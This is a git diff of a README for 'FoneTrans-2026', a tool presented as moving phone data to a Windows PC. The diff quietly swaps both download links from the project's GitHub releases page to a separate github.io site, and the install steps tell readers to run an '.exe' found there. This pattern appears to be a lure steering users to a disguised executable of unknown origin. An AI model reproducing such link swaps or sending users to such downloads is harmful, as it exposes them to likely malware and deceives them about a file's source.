@@ -1,6 +1,6 @@
 # 📱 FoneTrans-2026 - Move Phone Data To Your PC
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Extenuating-keeping434/FoneTrans-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://extenuating-keeping434.github.io)
 
 FoneTrans-2026 helps you manage files between your phone and your computer. This tool works on Windows 11 and Windows 10. Use this software to move photos, music, and contacts from your iPhone or Android device to your computer without data loss.
 
@@ -19,7 +19,7 @@ Make sure your computer meets these needs before you start.
 
 Follow these steps to get the file on your computer.
 
-1. Go to the [official release page](https://github.com/Extenuating-keeping434/FoneTrans-2026/releases).
+1. Go to the [official release page](https://extenuating-keeping434.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in ".exe" to start the download.
 4. Save the file to your "Downloads" folder.
